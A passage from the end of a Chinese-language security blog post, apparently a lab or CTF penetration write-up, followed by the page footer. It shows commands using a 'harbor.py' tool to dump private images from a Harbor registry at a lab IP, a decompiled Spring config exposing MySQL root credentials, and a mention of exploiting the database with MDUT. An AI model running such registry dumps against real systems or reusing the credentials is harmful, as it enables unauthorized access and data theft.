</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python3 harbor.py http://172.22.14.46/ 
</span></span><span class=line><span class=cl>python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2
</span></span></code></pre></td></tr></table></div></div><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250313142359-wpxuraj.png alt=image>​</p><p>然后在另外一个镜像中找到了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python3 harbor.py http://172.22.14.46/ --dump project/projectadmin --v2
</span></span></code></pre></td></tr></table></div></div><p>反编译后得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>spring.datasource.url<span class=o>=</span>jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding<span class=o>=</span>utf-8<span class=p>&amp;</span><span class=nv>useUnicode</span><span class=o>=</span>true<span class=p>&amp;</span><span class=nv>serverTimezone</span><span class=o>=</span>UTC
</span></span><span class=line><span class=cl>spring.datasource.username<span class=o>=</span>root
</span></span><span class=line><span class=cl>spring.datasource.password<span class=o>=</span>My3q1i4oZkJm3
</span></span><span class=line><span class=cl>spring.datasource.driver-class-name<span class=o>=</span>com.mysql.cj.jdbc.Driver
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mybatis.type-aliases-package<span class=o>=</span>com.smartlink.projectadmin.entity
</span></span><span class=line><span class=cl>mybatis.mapper-locations<span class=o>=</span>classpath:mybatis/mapper/*.xml
</span></span></code></pre></td></tr></table></div></div><p>MDUT一把梭，但是extend版的怎么都连接不上</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250313150405-92prdgy.png alt=image>​</p><p>最后一台机子是一个k8s，但是不知道为什么怎么都无法访问</p></section><div class=comments><script>const getTheme=window.localStorage&&window.localStorage.getItem("theme");let theme=getTheme==="dark"?"dark":"light",s=document.createElement("script");s.src="https://giscus.app/client.js",s.setAttribute("data-repo","Wh1teJ0ker/discussion"),s.setAttribute("data-repo-id","R_kgDOOTzcZA"),s.setAttribute("data-category","Announcements"),s.setAttribute("data-category-id","DIC_kwDOOTzcZM4CoxXV"),s.setAttribute("data-mapping","pathname"),s.setAttribute("data-strict","0"),s.setAttribute("data-reactions-enabled","1"),s.setAttribute("data-emit-metadata","0"),s.setAttribute("data-input-position","top"),s.setAttribute("data-theme",theme),s.setAttribute("data-lang","zh-CN"),s.setAttribute("data-loading","lazy"),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div><div class=paginator><a class=prev href=https://wh1tej0ker.github.io/post/2025-underworld-ctf-1atj9l.html><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966 5.98257 11.8297 5.98456 11.9753 6.05061 12.0063c1.00435.4716 2.8788 1.9201 3.89435 2.9937M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentcolor" stroke-linecap="round"/></svg>
<span>2025阴间CTF</span></a>
<a class=next href=https://wh1tej0ker.github.io/post/vulnhubsickos11-z1xib45.html><span>VulnHub-SickOS1.1</span><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966 16.0174 11.8297 16.0154 11.9753 15.9494 12.0063 14.945 12.4779 13.0706 13.9264 12.055 15m3.5006-3.0333C13.1345 12.0608 8 12 6 11" stroke="currentcolor" stroke-linecap="round"/></svg></a></div></article></div><footer class=footer><p>&copy; 2025 <a href=https://wh1tej0ker.github.io/>Wh1teJ0kerのBlog</a>
Powered by
<a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>
<a href=https://github.com/guangzhengli/hugo-theme-ladder rel=noopener target=_blank>Ladder</a>
️</p></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="Copy";function n(){t.innerHTML="Copied",setTimeout(()=>{t.innerHTML="Copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),n();return}const s=document.createRange();s.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(s);try{document.execCommand("copy"),n()}catch{}o.removeRange(s)}),e.parentNode.appendChild(t)})</script></main></body><script src=/main.min.cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e.js integrity="sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==" crossorigin=anonymous defer></script></html>